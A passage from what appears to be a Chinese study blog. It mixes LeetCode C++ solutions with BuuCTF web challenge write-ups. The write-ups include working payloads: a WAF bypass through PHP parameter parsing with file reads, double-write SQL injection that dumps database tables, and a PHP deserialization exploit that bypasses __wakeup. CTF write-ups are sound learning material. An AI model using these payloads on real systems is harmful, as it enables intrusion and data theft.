<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">isPowerOfThree</span><span class="params">(<span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(n&lt;=<span class="number">0</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="type">int</span> x=n;</span><br><span class="line">        <span class="keyword">while</span>(x!=<span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(x%<span class="number">3</span>==<span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                x=x/<span class="number">3</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h5 id="4的幂"><a href="#4的幂" class="headerlink" title="4的幂"></a>4的幂</h5><p>判断一个整数是否是4的幂。首先对输入的整数进行判断，如果小于等于0则直接返回false。然后对输入的整数进行循环除以4的操作，直到除以4得到的结果为1为止。在循环过程中，如果发现余数不为0则返回false，表示输入的整数不是4的幂。最终如果循环结束，说明输入的整数是4的幂，返回true。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">isPowerOfFour</span><span class="params">(<span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(n&lt;=<span class="number">0</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="type">int</span> x=n;</span><br><span class="line">        <span class="keyword">while</span>(x!=<span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(x%<span class="number">4</span>==<span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                x=x/<span class="number">4</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h5 id="统计能整除数字的位数"><a href="#统计能整除数字的位数" class="headerlink" title="统计能整除数字的位数"></a>统计能整除数字的位数</h5><p>计算一个整数中有多少个数字能整除这个整数本身。首先定义一个变量n用于记录符合条件的数字个数，另一个变量m用于保存输入的整数。然后对输入的整数进行循环，每次取出最后一位数字进行判断是否能整除整数本身。如果能整除，则n加1。最后返回n，表示整数中有多少个数字能整除这个整数。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">countDigits</span><span class="params">(<span class="type">int</span> num)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n=<span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> m=num;</span><br><span class="line">        <span class="keyword">while</span>(m!=<span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(num%(m%<span class="number">10</span>)==<span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                n++;</span><br><span class="line">            &#125;</span><br><span class="line">            m=m/<span class="number">10</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> n;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h4 id="BuuCTF"><a href="#BuuCTF" class="headerlink" title="BuuCTF"></a>BuuCTF</h4><h5 id="17、BackupFile"><a href="#17、BackupFile" class="headerlink" title="17、BackupFile"></a>17、BackupFile</h5><p>题目名称叫备份文件，直接用dirsearch扫描：<code>py -3.9 http://2677258c-1c01-46a9-9f37-cef51bea8534.node4.buuoj.cn:81/ -e php</code></p>
<p>响应成功的</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/ee3eec70-5351-4d8b-af21-f802483b053d" alt="image"></p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/d6360fc0-cbb5-47e2-a051-18bf83d4e923" alt="image"></p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/d7f8a29a-c367-4885-8554-b6f89df5456a" alt="image"></p>
<p>访问&#x2F;index.php.bak文件，下载下来了</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/aacfde44-4ed9-49df-a3b5-ec6a188a3947" alt="image"></p>
<p>查看文件，如果key&#x3D;123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3，输出flag</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/c009b63e-5173-4f33-998c-8acff7917b82" alt="image"></p>
<p>如果直接构造payload：<code>/?key=123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3</code></p>
<p>显示只要数字</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/513a2e45-2b72-4878-b662-8a0998120daa" alt="image"></p>
<p>&#x3D;&#x3D;是弱相等，所以当key&#x3D;123时，就会输出flag</p>
<p>构造payload：<code>/?key=123</code></p>
<p>得到flag</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/f632811c-a5ef-4ef6-a660-63d1f105cc37" alt="image"></p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;7e29466e-c1e3-4679-8eda-80c196664fe2&#125;</span><br></pre></td></tr></table></figure>

<h5 id="18、Easy-Calc"><a href="#18、Easy-Calc" class="headerlink" title="18、Easy Calc"></a>18、Easy Calc</h5><p>查看源代码，没看到啥</p>
<p>抓包，发现一个calc.php文件</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/64070944-a8ec-4ddc-8a5e-b0a0f4cd5766" alt="image"></p>
<p>查看该文件，有一个黑名单</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/2d679f14-d490-49c7-a112-758b0ff6d0f4" alt="image"></p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">知识点：</span><br><span class="line">chr() 函数：从指定的 ASCII 值返回字符。 ASCII 值可被指定为十进制值、八进制值或十六进制值。八进制值被定义为带前置0，而十六进制值被定义为带前置 0x。</span><br><span class="line">file_get_contents() 函数：把整个文件读入一个字符串中。该函数是用于把文件的内容读入到一个字符串中的首选方法。如果服务器操作系统支持，还会使用内存映射技术来增强性能。</span><br><span class="line">PHP的字符串解析特性：PHP需要将所有参数转换为有效的变量名，因此在解析查询字符串时，它会做两件事：1.删除空白符 2.将某些字符转换为下划线（包括空格）【当waf不让你过的时候，php却可以让你过】。假如waf不允许num变量传递字母，可以在num前加个空格，这样waf就找不到num这个变量了，因为现在的变量叫“ num”，而不是“num”。但php在解析的时候，会先把空格给去掉，这样我们的代码还能正常运行，还上传了非法字符。</span><br><span class="line">scandir() 函数：返回指定目录中的文件和目录的数组。</span><br></pre></td></tr></table></figure>

<p>查看源码，$(“#content”).val()相当于 document.getElementById(“content”).value;</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/d5bebfc0-7a4a-4c28-8cfa-28217d97f23b" alt="image"></p>
<p>PHP的字符串解析特性</p>
<p>尝试一下<code>/calc.php?num=phpinfo()</code></p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/1eb16acf-82ce-4a42-89b3-471967bbfeb7" alt="image"></p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PHP的字符串解析特性：PHP需要将所有参数转换为有效的变量名，因此在解析查询字符串时，它会做两件事：1.删除空白符 2.将某些字符转换为下划线（包括空格）【当waf不让你过的时候，php却可以让你过】。假如waf不允许num变量传递字母，可以在num前加个空格，这样waf就找不到num这个变量了，因为现在的变量叫“ num”，而不是“num”。但php在解析的时候，会先把空格给去掉，这样我们的代码还能正常运行，还上传了非法字符。</span><br></pre></td></tr></table></figure>

<p>加个空格</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/9c859a82-1cc8-4891-bd32-d7fa3b3f1847" alt="image"></p>
<p>由于“&#x2F;”被过滤了，所以我们可以使用chr(47)来进行表示，进行目录读取：<br><code>calc.php? num=1;var_dump(scandir(chr(47)))</code></p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/083477f9-5926-4b52-9337-e540bb2a0bc3" alt="image"></p>
<p>构造：<code>/flagg——chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)</code></p>
<p>payload：<code>calc.php? num=1;var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))</code></p>
<p>得到flag</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/e88842dc-7cb8-4c54-b91a-6dbc7a589b30" alt="image"></p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;21d2d1ed-ae60-4490-a8b0-0f712482f7cd&#125;</span><br></pre></td></tr></table></figure>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2024/02/21/20240221/" data-id="clsvs9w9n0000z0vf3amg4dzj" data-title="20240221" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/learn/" rel="tag">learn</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-20240220" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2024/02/20/20240220/" class="article-date">
  <time class="dt-published" datetime="2024-02-20T12:41:36.000Z" itemprop="datePublished">2024-02-20</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2024/02/20/20240220/">20240220</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h4 id="LeetCode"><a href="#LeetCode" class="headerlink" title="LeetCode"></a>LeetCode</h4><h5 id="各位相加"><a href="#各位相加" class="headerlink" title="各位相加"></a>各位相加</h5><p>addDigits函数接受一个整数num作为参数，然后通过一个while循环来计算各位数字相加的结果。在循环中，首先将num的个位数字加到sum中，然后将num除以10，以便在下一次循环中继续计算下一位数字。当num变为0时，说明已经计算完所有位上的数字，此时判断sum的值是否小于10，如果小于10则直接返回sum作为结果；如果大于等于10，则将sum赋值给num，然后将sum重置为0，继续下一轮计算。最终返回的sum即为各位数字相加的结果。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">addDigits</span><span class="params">(<span class="type">int</span> num)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> sum=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(num!=<span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            sum+=num%<span class="number">10</span>;</span><br><span class="line">            num=num/<span class="number">10</span>;</span><br><span class="line">            <span class="keyword">if</span>(num==<span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>(sum&lt;<span class="number">10</span>) <span class="keyword">return</span> sum;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                &#123;</span><br><span class="line">                    num=sum;</span><br><span class="line">                    sum=<span class="number">0</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sum;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h5 id="丑数"><a href="#丑数" class="headerlink" title="丑数"></a>丑数</h5><p>isUgly函数接受一个整数n作为参数，然后通过三重循环来计算所有可能的2、3、5的指数组合，然后判断是否等于n。如果等于n，则返回true，表示n是一个丑数；如果循环结束都没有找到符合条件的组合，那么返回false，表示n不是一个丑数。这段代码的时间复杂度较高，因为通过三重循环计算所有可能的指数组合会导致算法效率低下，更好的解决方案是通过不断除以2、3、5来简化n，直到n变为1或者无法再被2、3、5整除为止。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">isUgly</span><span class="params">(<span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(n&lt;=<span class="number">0</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="type">int</span> i=<span class="number">0</span>,j=<span class="number">0</span>,z=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">32</span>;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;<span class="number">20</span>;j++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">for</span>(z=<span class="number">0</span>;z&lt;<span class="number">14</span>;z++)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">if</span>(<span class="built_in">pow</span>(<span class="number">2</span>,i)*<span class="built_in">pow</span>(<span class="number">3</span>,j)*<span class="built_in">pow</span>(<span class="number">5</span>,z)==n) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h5 id="丢失的数字"><a href="#丢失的数字" class="headerlink" title="丢失的数字"></a>丢失的数字</h5><p>missingNumber函数接受一个整数数组nums作为参数，首先对nums进行排序，然后获取nums的长度n。接着判断特殊情况：若数组只有一个元素，则返回1减去该元素的值；若数组的第一个元素不是0，则返回0（因为0是缺失的数字）。然后通过循环遍历数组中的元素，找到第一个不连续的数字，即当前数字和下一个数字之差不为1，此时缺失的数字就是当前数字加1。最终返回的结果即为缺失的数字。这段代码的时间复杂度为O(nlogn)，因为对数组进行了排序操作。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">missingNumber</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">sort</span>(nums.<span class="built_in">begin</span>(),nums.<span class="built_in">end</span>());</span><br><span class="line">        <span class="type">int</span> n=nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> i=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span>(n==<span class="number">1</span>) <span class="keyword">return</span> <span class="number">1</span>-nums[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">if</span>(nums[<span class="number">0</span>]!=<span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;n<span class="number">-1</span>;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(nums[i+<span class="number">1</span>]-nums[i]!=<span class="number">1</span>) </span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> nums[i]+<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h4 id="BuuCTF"><a href="#BuuCTF" class="headerlink" title="BuuCTF"></a>BuuCTF</h4><h5 id="15、BabySQL"><a href="#15、BabySQL" class="headerlink" title="15、BabySQL"></a>15、BabySQL</h5><p>常规注入：<code>/check.php?username=admin&amp;password=1&#39; union select 1#</code></p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/ed301d3e-a195-4d86-abb1-871db2c6eb2c" alt="image"></p>
<p>根据报错信息，猜测union 、select可能被过滤了，试一下双写绕过<br><code>/check.php?username=admin&amp;password=1&#39; ununionion seselectlect 1#</code></p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/5d921e6b-5869-498e-a14a-4aa76ccf65b2" alt="image"></p>
<p>URL编码试一下，然后试列数<br>payload：<code>/check.php?username=admin&amp;password=1&#39; ununionion seselectlect 1,2,3%23</code>，登录成功</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/d4eaa532-463d-46e8-a088-2e411973852d" alt="image"></p>
<p>爆数据库:<code>/check.php?username=admin&amp;password=1&#39; ununionion seselectlect 1,2,group_concat(schema_name)frfromom(infoorrmation_schema.schemata) %23</code>，猜测flag在ctf里</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/1632ca5e-09f0-4d3e-b47e-b344f49646d8" alt="image"></p>
<p>爆表：<code>/check.php?username=admin&amp;password=1&#39; ununionion seselectlect 1,2, group_concat(table_name)frfromom(infoorrmation_schema.tables) whwhereere table_schema=&quot;ctf&quot; %23</code></p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/92267bcd-7eb4-4b5d-a41b-88ab75362b1e" alt="image"></p>
<p>查字段名：<code>/check.php?username=admin&amp;password=pwd &#39; ununionion seselectlect 1,2,group_concat(column_name) frfromom (infoorrmation_schema.columns) whwhereere table_name=&quot;Flag&quot;%23</code></p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/4876a461-70fe-43cf-b0c5-69b435606532" alt="image"></p>
<p><code>/check.php?username=admin&amp;password=pwd &#39; ununionion seselectlect 1,2,group_concat(flag) frfromom(ctf.Flag)%23</code></p>
<p>得到flag</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/6b20f762-65b5-42c8-8cad-00ac5910ed6e" alt="image"></p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;009a3737-39ae-44ff-8bfb-45287b1e2093&#125;</span><br></pre></td></tr></table></figure>

<h5 id="16、PHP"><a href="#16、PHP" class="headerlink" title="16、PHP"></a>16、PHP</h5><p>题目提示了备份网站</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/18c18833-30dc-498d-acf7-4095c042798c" alt="image"></p>
<p>使用目录扫描工具 dirsearch</p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/wuhongbin/p/14048052.html">目录扫描工具 dirsearch 使用详解 - FreeK0x00 - 博客园 (cnblogs.com)</a></p>
<p>可以直接到github上下载压缩包，解压后，进入目录运行cmd</p>
<p>首先安装dirsearch：<code>python setup.py install</code></p>
<p>如果报错，可能是因为pip版本太低，更新pip：<code>python -m pip install --upgrade pip</code></p>
<p>运行，开始扫描：<code>py -3.9 dirsearch.py -u http://15349308-86d1-4f57-8e2c-50b34e5d48eb.node4.buuoj.cn:81/ -e php</code></p>
<p>响应成功的如下图所示</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/fcc5c5f4-5fbe-4929-9938-3db7ff70dee8" alt="image"></p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/1908e07e-39aa-4685-9079-71f36405ed17" alt="image"></p>
<p>访问<a target="_blank" rel="noopener" href="http://www.zip文件,下载了一个压缩包/">www.zip文件，下载了一个压缩包</a></p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/c166170d-069f-4d99-acb4-e75a2c6ac3fc" alt="image"></p>
<p>解压得到一系列文件</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/9be93ca0-b413-4787-8b29-3115eec2be45" alt="image"></p>
<p>查看index.php文件，发现包含class.php文件，采用get传参select，还有个php反序列化函数unserialize()</p>
<p>所以页面可以传进一个参数<code>select</code>然后把它反序列化，反序列化的过程中会用到class.php</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/917331c7-3a19-4c6a-b5b8-2d08ca263360" alt="image"></p>
<p>查看class.php文件，有输出flag的条件</p>
<p>要调用到__destruct（）并且<code>password=100,username=admin</code>才能<code>echo $flag</code></p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/ae9dc2e9-205f-41ab-916a-2d1f257c26ed" alt="image"></p>
<p>魔法函数</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">在反序列化脚本结束时会自动调用它，它是unserialize()结束的魔术方法（魔法函数）</span><br><span class="line"></span><br><span class="line">魔法函数</span><br><span class="line">通常来说有一些PHP的魔法函数会导致反序列化漏洞，如：</span><br><span class="line">__construct 当一个对象创建时自动调用</span><br><span class="line">__destruct 当对象被销毁时自动调用 (php绝大多数情况下会自动调用销毁对象)</span><br><span class="line">__sleep() 使**用serialize()函数时触发</span><br><span class="line">__wakeup 使用unserialse()**函数时会自动调用</span><br><span class="line">__toString 当一个对象被当作一个字符串被调用。</span><br><span class="line">__call() 在对象上下文中调用不可访问的方法时触发</span><br><span class="line">__callStatic() 在静态上下文中调用不可访问的方法时触发</span><br><span class="line">__get() 用于从不可访问的属性读取数据//调用私有属性时使用</span><br><span class="line">__set() 用于将数据写入不可访问的属性</span><br><span class="line">__isset() 在不可访问的属性上调用isset()或empty()触发</span><br><span class="line">__unset() 在不可访问的属性上使用unset()时触发</span><br><span class="line">__toString() 把类当作字符串使用时触发,返回值需要为字符串</span><br><span class="line">__invoke() 当脚本尝试将对象调用为函数时触发</span><br></pre></td></tr></table></figure>

<p>构造序列化，php代码：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Name</span><br><span class="line">&#123;</span><br><span class="line">    private $username = &quot;yesyesyes&quot;;</span><br><span class="line">    private $password = &quot;nonono&quot;;</span><br><span class="line">    public function __construct($username,$password)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;username=$username;</span><br><span class="line">        $this-&gt;password=$password;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = new Name(@admin,100);</span><br><span class="line">//var_dump($a);</span><br><span class="line">//echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">$b = serialize($a);</span><br><span class="line">echo $b.&quot;&lt;br&gt;&quot;;//输出序列化</span><br><span class="line">echo urlencode($b);//输出url编码后的序列化</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>序列化后是这样的：</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/92a4085c-3183-425c-90bf-5175c5f4b940" alt="image"></p>
<p>调用unserialize()时会自动调用魔法函数wakeup(),可以通过改变属性数绕过，把Name后面的2改为3或以上即可</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;Name&quot;:3:&#123;s:14:&quot;Nameusername&quot;;s:5:&quot;admin&quot;;s:14:&quot;Namepassword&quot;;i:100;&#125;</span><br></pre></td></tr></table></figure>

<p>然后url识别不了”，改为%22</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:%22Name%22:3:&#123;s:14:%22Nameusername%22;s:5:%22admin%22;s:14:%22Namepassword%22;i:100;&#125;</span><br></pre></td></tr></table></figure>

<p>因为成员（属性）是private，所以要在类名和成员名前加%00这个url编码是空的意思。因为生产序列化时不会把这个空也输出。</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:%22Name%22:3:&#123;s:14:%22%00Name%00username%22;s:5:%22admin%22;s:14:%22%00Name%00password%22;i:100;&#125;</span><br></pre></td></tr></table></figure>


<p>完整payload：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?select=O:4:%22Name%22:3:&#123;s:14:%22%00Name%00username%22;s:5:%22admin%22;s:14:%22%00Name%00password%22;i:100;&#125;</span><br></pre></td></tr></table></figure>

<p>得到flag</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/6916ddd3-236d-4ee7-9d17-962c0187f537" alt="image"></p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;1e6c9083-a44b-4c83-9a9c-f865d6230e68&#125;</span><br></pre></td></tr></table></figure>


      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2024/02/20/20240220/" data-id="clsud4xcb0000dsvfftecac63" data-title="20240220" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/learn/" rel="tag">learn</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-20240218" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2024/02/18/20240218/" class="article-date">
  <time class="dt-published" datetime="2024-02-18T10:46:34.000Z" itemprop="datePublished">2024-02-18</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2024/02/18/20240218/">20240218</a>
    </h1>
  

      </header>
    
